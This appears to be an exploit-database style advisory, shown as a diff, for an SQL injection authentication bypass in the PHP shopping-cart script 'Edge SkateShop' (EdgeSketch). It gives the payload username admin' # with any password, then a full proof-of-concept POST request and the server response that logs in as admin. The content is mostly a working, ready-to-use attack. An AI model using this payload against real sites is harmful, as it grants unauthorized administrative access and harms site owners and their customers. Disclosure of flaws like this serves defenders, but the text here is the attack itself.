@@ -1,0 +1,44 @@
+# Exploit Title: Edge SkateShop Authentication Bypass
+# Date: 6/12/2016
+# Exploit Author: Delilah
+# Vendor HomePage: http://www.sourcecodester.com/php/10964/basic-shopping-cartphpmysql.html
+# Software Link: http://www.sourcecodester.com/sites/default/files/download/gebbz/edgesketch.zip
+# Tested on: xampp
+
+go to http://localhost/EdgeSketch/adminlogin.php
+ 
+username = admin' #
+ 
+password = anything
+
+# Proof of Concept:
+
+POST /EdgeSketch/adminlogin.php HTTP/1.1
+Host: 10.0.2.15
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.2.15/EdgeSketch/
+Cookie: PHPSESSID=5n96kq5kd17joptp1sivhm4tl4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+admin_username=admin'%20#&admin_password=fdgdhf&admin_login=
+
+
+
+HTTP/1.1 200 OK
+Date: Tue, 06 Dec 2016 16:10:00 GMT
+Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+X-Powered-By: PHP/5.6.28
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 107
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script>alert('You're successfully login!')</script><script>window.open('Admin/index.php','_self')</script>
